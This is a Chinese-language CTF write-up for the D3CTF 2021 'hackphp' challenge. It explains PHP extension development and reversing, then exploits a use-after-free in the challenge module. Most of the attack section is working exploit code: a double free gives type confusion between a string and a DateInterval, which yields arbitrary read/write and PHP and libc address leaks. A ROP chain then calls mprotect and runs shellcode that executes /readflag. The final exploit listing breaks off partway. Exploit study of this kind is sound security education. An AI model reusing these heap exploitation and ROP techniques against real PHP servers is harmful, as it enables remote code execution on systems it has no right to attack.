# AntCTF ^ D3CTF 2021 hackphp

阅读量 **192704**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-11 12:00:55

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01e97bc95241ef2032.jpg)

## 0x00前言

从一题学习php模块的编写，学习WEB PWN，并演示WEB PWN中的堆UAF利用基本手法。

## 0x01 PHP模块的编写

php模块一般使用C/C++编写，编译后以库文件的形式进行加载，在Linux下为.so，Windows下为.dll。下面，我们来编写一个php模块的helloword，并在php里进行调用。  
首先下载php源码，进入php源码目录的ext目录,执行

    
    
    root@ubuntu:/home/sea/Desktop/php-src/ext# ./ext_skel.php --ext helloword
    Copying config scripts... done
    Copying sources... done
    Copying tests... done
    
    Success. The extension is now ready to be compiled. To do so, use the
    following steps:
    
    cd /path/to/php-src/helloword
    phpize
    ./configure
    make
    
    Don't forget to run tests once the compilation is done:
    make test
    
    Thank you for using PHP!
    

###  模块基本语法

该程序直接为我们生成了一个模板，我们可以直接查看源码

    
    
    /* helloword extension for PHP */
    
    #ifdef HAVE_CONFIG_H
    # include "config.h"
    #endif
    
    #include "php.h"
    #include "ext/standard/info.h"
    #include "php_helloword.h"
    
    /* For compatibility with older PHP versions */
    #ifndef ZEND_PARSE_PARAMETERS_NONE
    #define ZEND_PARSE_PARAMETERS_NONE() \
        ZEND_PARSE_PARAMETERS_START(0, 0) \
        ZEND_PARSE_PARAMETERS_END()
    #endif
    
    /* {{{ void helloword_test1()
     */
    PHP_FUNCTION(helloword_test1)
    {
        ZEND_PARSE_PARAMETERS_NONE();
    
        php_printf("The extension %s is loaded and working!\r\n", "helloword");
    }
    /* }}} */
    
    /* {{{ string helloword_test2( [ string $var ] )
     */
    PHP_FUNCTION(helloword_test2)
    {
        char *var = "World";
        size_t var_len = sizeof("World") - 1;
        zend_string *retval;
    
        ZEND_PARSE_PARAMETERS_START(0, 1)
            Z_PARAM_OPTIONAL
            Z_PARAM_STRING(var, var_len)
        ZEND_PARSE_PARAMETERS_END();
    
        retval = strpprintf(0, "Hello %s", var);
    
        RETURN_STR(retval);
    }
    /* }}}*/
    
    /* {{{ PHP_RINIT_FUNCTION
     */
    PHP_RINIT_FUNCTION(helloword)
    {
    #if defined(ZTS) && defined(COMPILE_DL_HELLOWORD)
        ZEND_TSRMLS_CACHE_UPDATE();
    #endif
    
        return SUCCESS;
    }
    /* }}} */
    
    /* {{{ PHP_MINFO_FUNCTION
     */
    PHP_MINFO_FUNCTION(helloword)
    {
        php_info_print_table_start();
        php_info_print_table_header(2, "helloword support", "enabled");
        php_info_print_table_end();
    }
    /* }}} */
    
    /* {{{ arginfo
     */
    ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)
    ZEND_END_ARG_INFO()
    
    ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)
        ZEND_ARG_INFO(0, str)
    ZEND_END_ARG_INFO()
    /* }}} */
    
    /* {{{ helloword_functions[]
     */
    static const zend_function_entry helloword_functions[] = {
        PHP_FE(helloword_test1,        arginfo_helloword_test1)
        PHP_FE(helloword_test2,        arginfo_helloword_test2)
        PHP_FE_END
    };
    /* }}} */
    
    /* {{{ helloword_module_entry
     */
    zend_module_entry helloword_module_entry = {
        STANDARD_MODULE_HEADER,
        "helloword",                    /* Extension name */
        helloword_functions,            /* zend_function_entry */
        NULL,                            /* PHP_MINIT - Module initialization */
        NULL,                            /* PHP_MSHUTDOWN - Module shutdown */
        PHP_RINIT(helloword),            /* PHP_RINIT - Request initialization */
        NULL,                            /* PHP_RSHUTDOWN - Request shutdown */
        PHP_MINFO(helloword),            /* PHP_MINFO - Module info */
        PHP_HELLOWORD_VERSION,        /* Version */
        STANDARD_MODULE_PROPERTIES
    };
    /* }}} */
    
    #ifdef COMPILE_DL_HELLOWORD
    # ifdef ZTS
    ZEND_TSRMLS_CACHE_DEFINE()
    # endif
    ZEND_GET_MODULE(helloword)
    #endif
    

其中由`PHP_FUNCTION`宏修饰的函数代表该函数可以直接在php中进行调用，由`PHP_RINIT_FUNCTION`修饰的函数将在一个新请求到来时被调用，其描述如下

> 当一个页面请求到来时候，PHP 会迅速开辟一个新的环境，并重新扫描自己的各个扩展，遍历执行它们各自的RINIT 方法(俗称 Request
> Initialization)，这时候一个扩展可能会初始化在本次请求中会使用到的变量等， 还会初始化用户端（即 PHP 脚本）中的变量之类的，内核预置了
> PHP_RINIT_FUNCTION() 这个宏函数来帮我们实现这个功能

由`PHP_MINIT_FUNCTION` 修饰的函数将在初始化module时运行。最终将需要在php中调用的函数指针写到一个统一的数组中。

    
    
    static const zend_function_entry helloword_functions[] = {
            PHP_FE(helloword_test1,         arginfo_helloword_test1)
            PHP_FE(helloword_test2,         arginfo_helloword_test2)
            PHP_FE_END
    };
    

然后由`zend_module_entry helloword_module_entry`进行注册，该结构体记录了整个模块需要提供的一些信息。

    
    
    zend_module_entry helloword_module_entry = {
            STANDARD_MODULE_HEADER,
            "helloword",                                    /* Extension name */
            helloword_functions,                    /* zend_function_entry */
            NULL,                                                   /* PHP_MINIT - Module initialization */
            NULL,                                                   /* PHP_MSHUTDOWN - Module shutdown */
            PHP_RINIT(helloword),                   /* PHP_RINIT - Request initialization */
            NULL,                                                   /* PHP_RSHUTDOWN - Request shutdown */
            PHP_MINFO(helloword),                   /* PHP_MINFO - Module info */
            PHP_HELLOWORD_VERSION,          /* Version */
            STANDARD_MODULE_PROPERTIES
    };
    

###  传参

在函数里，由`ZEND_PARSE_PARAMETERS_NONE()`修饰的代表无参数；而`ZEND_PARSE_PARAMETERS_START`规定了参数的个数，其定义如下

    
    
    #define ZEND_PARSE_PARAMETERS_START(min_num_args, max_num_args) ZEND_PARSE_PARAMETERS_START_EX(0, min_num_args, max_num_args)
    

而`Z_PARAM_OPTIONAL`代表参数可有可无，不是必须；`Z_PARAM_STRING(var,
var_len)`代表该参数是字符串对象，并且将其内容地址和长度分别赋值给var和var_len。  
还有很多类型，如下表：

    
    
    specifier    Fast ZPP API macro    args
    |    Z_PARAM_OPTIONAL
    a    Z_PARAM_ARRAY(dest)    dest - zval*
    A    Z_PARAM_ARRAY_OR_OBJECT(dest)    dest - zval*
    b    Z_PARAM_BOOL(dest)    dest - zend_bool
    C    Z_PARAM_CLASS(dest)    dest - zend_class_entry*
    d    Z_PARAM_DOUBLE(dest)    dest - double
    f    Z_PARAM_FUNC(fci, fcc)    fci - zend_fcall_info, fcc - zend_fcall_info_cache
    h    Z_PARAM_ARRAY_HT(dest)    dest - HashTable*
    H    Z_PARAM_ARRAY_OR_OBJECT_HT(dest)    dest - HashTable*
    l    Z_PARAM_LONG(dest)    dest - long
    L    Z_PARAM_STRICT_LONG(dest)    dest - long
    o    Z_PARAM_OBJECT(dest)    dest - zval*
    O    Z_PARAM_OBJECT_OF_CLASS(dest, ce)    dest - zval*
    p    Z_PARAM_PATH(dest, dest_len)    dest - char*, dest_len - int
    P    Z_PARAM_PATH_STR(dest)    dest - zend_string*
    r    Z_PARAM_RESOURCE(dest)    dest - zval*
    s    Z_PARAM_STRING(dest, dest_len)    dest - char*, dest_len - int
    S    Z_PARAM_STR(dest)    dest - zend_string*
    z    Z_PARAM_ZVAL(dest)    dest - zval*
         Z_PARAM_ZVAL_DEREF(dest)    dest - zval*
    +    Z_PARAM_VARIADIC('+', dest, num)    dest - zval*, num int
    *    Z_PARAM_VARIADIC('*', dest, num)    dest - zval*, num int
    

###  测试

编译以后得到了模块

    
    
    root@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# ls
    helloword.la  helloword.so
    

安装该模块

    
    
    cp helloword.so /usr/local/lib/php/extensions/no-debug-non-zts-20190902
    

php.ini里添加

    
    
    extension=helloword.so
    

测试程序如下

    
    
    <?php
    helloword_test1();
    helloword_test2("aaa");
    ?>
    

运行结果

    
    
    root@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# php 1.php
    The extension helloword is loaded and working!
    

可以看到模块成功被调用，并且在php中的调用十分方便，当成普通函数调用就可以了。

## 0x02 PHP模块逆向分析

将helloword.so模块用IDA打开分析

![](https://p1.ssl.qhimg.com/t01e169d4bd5aa4d03b.jpg)

定位到函数表，可以发现供我们在php里调用的函数有两个，且这些函数名都以`zif`开头

![](https://p5.ssl.qhimg.com/t0198d90f1291674856.jpg)

进入`zif_helloword_test2`函数，可以看到，宏都被展开了，前面是对参数个数的判断，后面则是对变量进行赋值。

![](https://p2.ssl.qhimg.com/t011c64a9b710ad590d.jpg)

至此，对php模块，我们已经有了大致的了解。

## 0x03 hackphp

###  漏洞分析

首先用IDA分析，找到`zif`开头的函数

![](https://p4.ssl.qhimg.com/t0151c8f0ef04b3f52c.png)

因此，在php中我们能调用该模块中的4个函数，分别为

    
    
    hackphp_create
    hackphp_delete
    hackphp_edit
    hackphp_get
    

hackphp_create函数接收一个整型参数，其功能是可以调用`_emalloc`创建一个堆，这里存在一个UAF漏洞，就是当`0<=size<256或者size>512`时不会直接`return`，会执行到`efree`将申请的堆给释放掉，然后其指针仍然保留给了`buf`全局变量。

![](https://p0.ssl.qhimg.com/t01656df9ecdf33fb1f.png)

hackphp_delete函数无参数，其功能是将buf指向的堆efree掉，并清空buf指针

![](https://p1.ssl.qhimg.com/t0121deea040535442a.jpg)

hackphp_edit函数接收一个字符串参数，并将其内容写入到buf里，这里注意的是，php里传入的字符串，即使其字符串中存在`\x00`，其length也不是以该字符截断的，该字符串对象的length成员表示其内容的`字节数`，并且在hackphp_edit函数中，使用了`memcpy`而不是`strncpy`这意味着hackphp_edit不会因为字符串中存在`\0`而截断，因此，我们可以用该函数进行字节编辑。

![](https://p5.ssl.qhimg.com/t01189b268a3272c7ce.jpg)

hackphp_get函数用于显示`buf`的内容，由于使用的是`zend_strpprintf(0LL,"%s",
buf)`因此会受到`\0`字符的截断。

![](https://p3.ssl.qhimg.com/t01de87c0d3247a7b79.jpg)

漏洞分析完了，该模块存在一个UAF，但是由于使用的是`emalloc/efree`不能像glibc的`ptmalloc`那样进行花式利用，我们可以利用`double
free`，因为通过测试，`double
free`不会报错，并且重新申请两次时都可以申请到此处，因此我们可以考虑让两个php对象同时占位于此，达到`类型混淆`的目的。

###  漏洞利用分析

我们可以将`DateInterval`对象占位于此。为了确定该对象的结构大小，我们使用如下代码测试，其中`$str =
fread(STDIN,1000);`起到阻塞的效果。

    
    
    <?php
    $str = fread(STDIN,1000);
    $dv = new DateInterval('P1Y');
    $str = fread(STDIN,1000);
    ?>
    

运行该程序`php 1.php`,然后另外开一个窗口，用gdb进行attach调试。给emalloc函数下断点

    
    
    pwndbg> b _emalloc
    Breakpoint 1 at 0x55ea1e726970: file /home/sea/Desktop/php-src/Zend/zend_alloc.c, line 2533.
    

然后继续运行,程序断下后，发现此时size为`56`

![](https://p3.ssl.qhimg.com/t012d4505e30f4d7232.jpg)

继续运行，发现不止一次下断，我们记录下每一次下断后emalloc返回的地址，最终发现第一次`emalloc(56)`的堆里有许多有用的数据。

    
    
     RAX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ...
    *RBX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ...
     RCX  0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ...
     RDX  0x7f5e33200070 —▸ 0x7f5e332010c0 —▸ 0x7f5e332010d8 —▸ 0x7f5e332010f0 —▸ 0x7f5e33201108 ◂— ...
     RDI  0x7f5e33200040 ◂— 0x0
    *RSI  0x5654177dbf50 ◂— 0x1
     R8   0x7f5e33254440 ◂— 0x600000001
     R9   0x7f5e33200000 —▸ 0x7f5e33200040 ◂— 0x0
     R10  0x7f000
     R11  0x246
    *R12  0x7f5e332551d0 ◂— 0x0
     R13  0x0
     R14  0x7f5e33212020 —▸ 0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64 
     R15  0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64 
     RBP  0x5654177dbf50 ◂— 0x1
    *RSP  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 ('y.\n; htt')
    *RIP  0x5654152b6512 (date_object_new_interval+66) ◂— movups xmmword ptr [rax], xmm0
    ──────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
       0x5654152b64fc <date_object_new_interval+44>    pxor   xmm0, xmm0
       0x5654152b6500 <date_object_new_interval+48>    mov    rsi, rbp
       0x5654152b6503 <date_object_new_interval+51>    mov    qword ptr [rax + 0x30], 0
       0x5654152b650b <date_object_new_interval+59>    lea    r12, [rax + 0x10]
       0x5654152b650f <date_object_new_interval+63>    mov    rbx, rax
     ► 0x5654152b6512 <date_object_new_interval+66>    movups xmmword ptr [rax], xmm0
       0x5654152b6515 <date_object_new_interval+69>    mov    rdi, r12
       0x5654152b6518 <date_object_new_interval+72>    movups xmmword ptr [rax + 0x10], xmm0
       0x5654152b651c <date_object_new_interval+76>    movups xmmword ptr [rax + 0x20], xmm0
       0x5654152b6520 <date_object_new_interval+80>    call   zend_object_std_init <zend_object_std_init>
    
       0x5654152b6525 <date_object_new_interval+85>    mov    rsi, rbp
    ───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────────────
    In file: /home/sea/Desktop/php-src/Zend/zend_objects_API.h
       89  * Properties MUST be initialized using object_properties_init(). */
       90 static zend_always_inline void *zend_object_alloc(size_t obj_size, zend_class_entry *ce) {
       91     void *obj = emalloc(obj_size + zend_object_properties_size(ce));
       92     /* Subtraction of sizeof(zval) is necessary, because zend_object_properties_size() may be
       93      * -sizeof(zval), if the object has no properties. */
     ► 94     memset(obj, 0, obj_size - sizeof(zval));
       95     return obj;
       96 }
       97 
       98 static inline zend_property_info *zend_get_property_info_for_slot(zend_object *obj, zval *slot)
       99 {
    ───────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 ('y.\n; htt')
    01:0008│      0x7ffe15719fd8 —▸ 0x5654177dbf50 ◂— 0x1
    02:0010│      0x7ffe15719fe0 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e ('nt Log o')
    03:0018│      0x7ffe15719fe8 —▸ 0x56541550c9a9 (object_init_ex+57) ◂— mov    dword ptr [rbx + 8], 0x308
    04:0020│      0x7ffe15719ff0 ◂— 0x0
    05:0028│      0x7ffe15719ff8 —▸ 0x7f5e33212190 ◂— 0x206f74203b0a6465 ('ed\n; to ')
    06:0030│      0x7ffe1571a000 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 ('y.\n; htt')
    07:0038│      0x7ffe1571a008 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e ('nt Log o')
    ─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────
     ► f 0     5654152b6512 date_object_new_interval+66
       f 1     5654152b6512 date_object_new_interval+66
       f 2     56541550c9a9 object_init_ex+57
       f 3     56541550c9a9 object_init_ex+57
       f 4     56541556f585 ZEND_NEW_SPEC_CONST_UNUSED_HANDLER+53
       f 5     56541558ba05 execute_ex+8741
       f 6     5654155932bd zend_execute+301
       f 7     56541550ac3c zend_execute_scripts+204
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    

如上，`0x7f5e332551c0`为`emalloc(56)`申请的堆，我们记下该地址，然后输入`c`继续运行，直到程序不再下断，也就是执行到php代码里的最后一句`$str
= fread(STDIN,1000);`时，此时`DateInterval`对象创建完成，我们查看该地址处的内容。

    
    
    pwndbg> tel 0x7f5e332551c0
    00:0000│   0x7f5e332551c0 —▸ 0x7f5e3327e000 ◂— 0x1
    01:0008│   0x7f5e332551c8 ◂— 0x1
    02:0010│   0x7f5e332551d0 ◂— 0xc000041800000001
    03:0018│   0x7f5e332551d8 ◂— 0x1
    04:0020│   0x7f5e332551e0 —▸ 0x5654177dbf50 ◂— 0x1
    05:0028│   0x7f5e332551e8 —▸ 0x56541607a0a0 (date_object_handlers_interval) ◂— 0x10
    06:0030│   0x7f5e332551f0 ◂— 0x0
    07:0038│   0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ...
    pwndbg> tel 0x56541607a0a0
    00:0000│   0x56541607a0a0 (date_object_handlers_interval) ◂— 0x10
    01:0008│   0x56541607a0a8 (date_object_handlers_interval+8) —▸ 0x5654152b5790 (date_object_free_storage_interval) ◂— endbr64 
    02:0010│   0x56541607a0b0 (date_object_handlers_interval+16) —▸ 0x56541553be40 (zend_objects_destroy_object) ◂— endbr64 
    03:0018│   0x56541607a0b8 (date_object_handlers_interval+24) —▸ 0x5654152b6550 (date_object_clone_interval) ◂— endbr64 
    04:0020│   0x56541607a0c0 (date_object_handlers_interval+32) —▸ 0x5654152b5aa0 (date_interval_read_property) ◂— endbr64 
    05:0028│   0x56541607a0c8 (date_object_handlers_interval+40) —▸ 0x5654152b5e50 (date_interval_write_property) ◂— endbr64 
    06:0030│   0x56541607a0d0 (date_object_handlers_interval+48) —▸ 0x56541553cba0 (zend_std_read_dimension) ◂— endbr64 
    07:0038│   0x56541607a0d8 (date_object_handlers_interval+56) —▸ 0x56541553ce70 (zend_std_write_dimension) ◂— endbr64 
    pwndbg>
    

可以发现该对象内部存在一个虚表，虚表里有许多函数指针，因此，我们可以利用某些方法将这些数据读取出来，进而实现了地址泄露。假设我们将该对象占位于`hackphp`模块中的UAF堆里，用`hackphp_get`实现不了泄露，因为该函数遇到`\0`会截断。因此我们可以考虑在之前先构造一个`double
free`然后将`DateInterval`对象占位于此以后，将另外一个对象也占位于此，并且另外一个对象应该能够使用运算符`[]`，这样我们可以使用运算符`[]`来读取数据。一个可以考虑的对象是通过`str_repeat("a",n);`创建的字符串对象，至于不直接使用`array`是因为`array`对象有些复杂，而字符串对象相对来说要简单一些。首先，我们得确定`n`为多少，才能让其大小为`56`与`DateInterval`对象保持一致。  
首先尝试`0x30`

    
    
    <?php
    $str = fread(STDIN,1000);
    $dv = str_repeat("a",0x30); 
    $str = fread(STDIN,1000);
    ?>
    

仍然使用gdb进行调试，发现实际调用`emalloc`时，size为0x50

![](https://p3.ssl.qhimg.com/t01cee9793991bbc75f.jpg)

因此，如果我们要控制字符串对象的大小为56的话，n应该为0x18，也就是这样

    
    
    $str = str_repeat("a",0x18);
    
    
    
     RAX  0x7fe101a551c0 —▸ 0x7fe101a551f8 —▸ 0x7fe101a55230 —▸ 0x7fe101a55268 —▸ 0x7fe101a552a0 ◂— ...
    
    In file: /home/sea/Desktop/php-src/Zend/zend_string.h
       141 
       142 static zend_always_inline zend_string *zend_string_safe_alloc(size_t n, size_t m, size_t l, int persistent)
       143 {
       144     zend_string *ret = (zend_string *)safe_pemalloc(n, m, ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(l)), persistent);
       145 
     ► 146     GC_SET_REFCOUNT(ret, 1);
       147     GC_TYPE_INFO(ret) = IS_STRING | ((persistent ? IS_STR_PERSISTENT : 0) << GC_FLAGS_SHIFT);
       148     ZSTR_H(ret) = 0;
       149     ZSTR_LEN(ret) = (n * m) + l;
       150     return ret;
       151 }
    

记下其地址`0x7fe101a551c0`，然后继续运行，直到不再下断。

![](https://p2.ssl.qhimg.com/t013a669d46ab37e228.jpg)

可以发现，字符串对象结构比较简单，0x18偏移处就是数据区长度，如果我们将其篡改，就可以实现越界读写。假设该对象也占位与`hackphp`模块的UAF堆中，那么我们就能利用该字符串对象对`DateInterval`对象内部的数据进行读写。

###  漏洞利用

于是，我们的php脚本这样写

    
    
    //double free
    hackphp_create(56);
    hackphp_delete();
    
    //$x and $dv now has same address
    $x = str_repeat("D",0x18);
    $dv = new DateInterval('P1Y');
    
    $dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);
    echo sprintf("dv_vatble=0x%lx",$dv_vtable_addr);
    echo  "\n";
    $dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;
    echo sprintf("dv_self_obj_addr=0x%lx",$dv_self_obj_addr);
    echo "\n";
    

通过上面的脚本，我们已经得到`vtable`的地址以及该对象自身的地址。接下来，我们重新创建一个堆，然后将一个新的字符串对象占位，通过UAF修改字符串的length成员，从而该字符串对象将具有任意地址读写的能力。

    
    
    hackphp_create(0x60);
    $oob = str_repeat("D",0x40);
    hackphp_edit("\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00");
    $oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;
    echo sprintf("oob_self_obj_addr=0x%lx",$oob_self_obj_addr);
    echo "\n";
    $offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);
    function read64($oob,$addr) {
       /*if ($addr < 0) {
          $addr = 0x10000000000000000 + $addr;
       }*/
       return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);
    }
    
    echo sprintf("offset=0x%lx",$offset);
    

接下来，就可以泄露虚表里的函数指针地址了，计算出php二进制程序的基址，然后泄露GOT表，计算libc地址，获得gadgets及一些函数的地址。

    
    
    $date_object_free_storage_interval_addr = read64($oob,$offset+1);
    echo sprintf("date_object_free_storage_interval_addr=0x%lx",$date_object_free_storage_interval_addr);
    echo "\n";
    
    $php_base = $date_object_free_storage_interval_addr - 0x23D790;
    $strlen_got = $php_base + 0xFFEEB8;
    
    $offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;
    $strlen_addr = read64($oob,$offset);
    $libc_base = $strlen_addr - 0x18b660;
    $pop_rdi = $libc_base + 0x0000000000026b72;
    $pop_rsi = $libc_base + 0x0000000000026b70;
    $pop_rdx = $libc_base + 0x0000000000162866;
    
    $stack_ptr = $libc_base + 0x1ec440;
    
    $offset = $stack_ptr - ($oob_self_obj_addr + 0x18);
    $stack_addr = read64($oob,$offset);
    $mprotect_addr = $libc_base + 0x11BB00;
    
    echo sprintf("strlen_addr=0x%lx \n",$strlen_addr);
    echo sprintf("libc_base=0x%lx \n",$libc_base);
    echo sprintf("stack_addr=0x%lx \n",$stack_addr);
    

接下来就是如何劫持程序流了，由于具有了任意地址读写的能力，那么利用手法就是仁者见仁智者见智了。  
然而当你调用`$oob[x]`进行写时，如果`x<=0`会发现报错

    
    
    found!PHP Warning:  Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155
    
    Warning: Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155
    

通过分析源码

    
    
    static zend_never_inline void zend_assign_to_string_offset(zval *str, zval *dim, zval *value, zval *result)
    {
        zend_string *old_str;
        zend_uchar c;
        size_t string_len;
        zend_long offset;
    
        if (UNEXPECTED(Z_TYPE_P(dim) != IS_LONG)) {
            offset = zend_check_string_offset(dim/*, BP_VAR_W*/);
        } else {
            offset = Z_LVAL_P(dim);
        }
        if (offset < -(zend_long)Z_STRLEN_P(str)) {
            /* Error on negative offset */
            zend_error(E_WARNING, "Illegal string offset " ZEND_LONG_FMT, offset);
            if (result) {
                ZVAL_NULL(result);
            }
            return;
        }
    

关键一句

    
    
    if (offset < -(zend_long)Z_STRLEN_P(str))
    

因为这里，我们`length`修改为了`-1`，所以`Z_STRLEN_P(str)`返回的就是`-1`取反后就是1，也就是offset必须大于等于1，这意味着，我们只能向后进行任意地址写，当然，可以通过再次修改length为正数，绕过这个if检查。但是我没有这么做，因为栈地址位于最后，所以我可以直接向后找到栈地址，然后劫持栈。

为了确定栈ROP的位置，我使用了栈内存搜索，知道搜索到一个指定的返回地址结束。因为`php_execute_script`是执行php脚本的具体实现，所以，我们只需劫持该函数的返回地址，那么我们就需要在栈里搜索该地址，如果找到，就说明这个位置就是我们写ROP的地方了。

![](https://p1.ssl.qhimg.com/t018d7d058399e2bbc7.jpg)

    
    
    $ret_main_target = $php_base + 0x51d402;
    //搜索ROP的地址
    while (true) {
       $data = read64($oob,$offset);
       //echo sprintf("0x%lx",$hackphp_so_addr & 0xFFF);
       //echo "\n";
       if (intval($data) == intval($ret_main_target) ) {
          echo "found!";
          break;
       }
       $offset--;
    }
    

然后就是写入ROP了，不知道为何，不能封装为函数，否则会写入失败。

    
    
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rsi & 0xFF);
       $pop_rsi = $pop_rsi >> 0x8;
    }
    $offset += 0x8;
    $data = 0x1000;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    
    $offset += 0x10;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rdx & 0xFF);
       $pop_rdx = $pop_rdx >> 0x8;
    }
    $offset += 0x8;
    $data = 0x7;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 0x10;
    
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($pop_rdi & 0xFF);
       $pop_rdi = $pop_rdi >> 0x8;
    }
    
    
    $offset += 8;
    $stack_addr = $offset + ($oob_self_obj_addr + 0x18);
    
    $data = $stack_addr ^ ($stack_addr & 0xfff);
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 8;
    $data = $mprotect_addr;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $offset += 8;
    $data = $stack_addr+0x18;
    for ($j=0;$j<8;$j++) {
       $oob[$offset+$j] = chr($data & 0xFF);
       $data = $data >> 0x8;
    }
    $stack_addr += 0x18;
    $offset += 0x8;
    
    $shellcode = "\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05";
    $len = strlen($shellcode);
    
    //写shellcode
    for ($j=0;$j<$len;$j++) {
       $oob[$offset+$j] = $shellcode[$j];
    }
    

至此，就完成了漏洞利用。

###  exp

    
    
    <?php
    function u64($val) {
       $s = bin2hex($val);
       $len = strlen($s);
       $ans = "0x";
       for ($i=$len-2;$i>=0;$i-=2) {
          $ans = $ans . substr($s,$i,2);
       }
       return intval($ans,16);
    }
    function p32($val) {
       $s = dechex($val);
       $len = strlen($s);
       $ans = "";
       for ($i=$len-2;$i>=0;$i-=2) {
          $ans = $ans . substr($s,$i,2);
       }
       return hex2bin($ans);
    }
    
    //double free
    hackphp_create(56);
    hackphp_delete();
    
    //$x and $dv now has same address
    $x = str_repeat("D",0x18);
    $dv = new DateInterval('P1Y');
    
    $dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);
    echo sprintf("dv_vatble=0x%lx",$dv_vtable_addr);
    echo  "\n";
    $dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;
    echo sprintf("dv_self_obj_addr=0x%lx",$dv_self_obj_addr);
    echo "\n";
    
    hackphp_create(0x60);
    $oob = str_repeat("D",0x40);
    hackphp_edit("\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00");
    $oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;
    echo sprintf("oob_self_obj_addr=0x%lx",$oob_self_obj_addr);
    echo "\n";
    $offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);
    function read64($oob,$addr) {
       /*if ($addr < 0) {
          $addr = 0x10000000000000000 + $addr;
       }*/
       return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);
    }
    
    echo sprintf("offset=0x%lx",$offset);
    echo "\n";
    $date_object_free_storage_interval_addr = read64($oob,$offset+1);
    echo sprintf("date_object_free_storage_interval_addr=0x%lx",$date_object_free_storage_interval_addr);
    echo "\n";
    
    $php_base = $date_object_free_storage_interval_addr - 0x23D790;
    $strlen_got = $php_base + 0xFFEEB8;
    
    $offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;
